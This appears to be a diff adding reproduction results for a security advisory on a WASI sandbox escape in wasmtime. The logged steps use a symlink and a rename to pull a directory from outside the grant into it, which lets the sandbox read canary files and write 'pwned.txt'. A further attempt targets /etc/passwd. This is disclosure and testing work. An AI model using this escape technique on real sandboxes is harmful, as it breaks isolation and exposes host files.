@@ -1,0 +1,94 @@
+# Reproductions, EXECUTED 2026-10-18, host arm64 macOS (Darwin 25.5.0), wasmtime-py 49.0.0 / wasmtime 49.0.0
+# artifact set: build/sets/s-8d84b3b190fe9bce (frozen; not rebuilt)
+
+## 1. GHSA-m9f7-9w4p-gv38 — WRITABLE GRANT: full escape (grant/ writable, outside/ a sibling outside every grant)
+EXIT 0 TRAP None
+STDERR 
+{
+  "steps": [
+    [
+      "symlink ../outside -> up",
+      "ok"
+    ],
+    [
+      "rename 'up/'->'stolen'",
+      "ok"
+    ],
+    [
+      "rename 'up'->'stolen2/'",
+      "ok"
+    ],
+    [
+      "listdir stolen",
+      [
+        "loose_canary.txt",
+        "secret_dir"
+      ]
+    ],
+    [
+      "listdir stolen2",
+      "errno 63 Operation not permitted"
+    ],
+    [
+      "listdir up",
+      "errno 44 No such file or directory"
+    ],
+    [
+      "READ /work/stolen/secret_dir/canary.txt",
+      "CANARY-do-not-reach"
+    ],
+    [
+      "READ /work/stolen/loose_canary.txt",
+      "sibling-canary"
+    ],
+    [
+      "read /work/stolen2/secret_dir/canary.txt",
+      "errno 63 Operation not permitted"
+    ],
+    [
+      "read /work/up/loose_canary.txt",
+      "errno 44 No such file or directory"
+    ],
+    [
+      "WROTE /work/stolen/pwned.txt",
+      "ok"
+    ],
+    [
+      "write /work/up/pwned.txt",
+      "errno 44 No such file or directory"
+    ]
+  ]
+}
+# host after: outside/ gone (moved into grant/stolen):
+stolen
+stolen2
+ls: /private/tmp/claude-501/-Users-claygendron-Git-Repos-wasi-python/7b89cd25-8736-42c1-aab5-0a17add8b573/scratchpad/advisory-research/layout/outside: No such file or directory
+
+## 2. READ-ONLY GRANT: symlink creation refused
+EXIT 0 TRAP None
+[["symlink", "errno 63 Operation not permitted"]]
+
+## 3. root=True: symlink+rename mechanism reachable; /etc target gives EPERM (cross-device)
+EXIT 0 TRAP None
+[
+ [
+  "symlink ../../etc",
+  "ok"
+ ],
+ [
+  "rename",
+  "errno 63 Operation not permitted"
+ ],
+ [
+  "listdir /stolen",
+  "errno 44 No such file or directory"
+ ],
+ [
+  "read /stolen/hosts",
+  "errno 44 No such file or directory"
+ ],
+ [
+  "read /stolen/passwd",
+  "errno 44 No such file or directory"
+ ]
+]
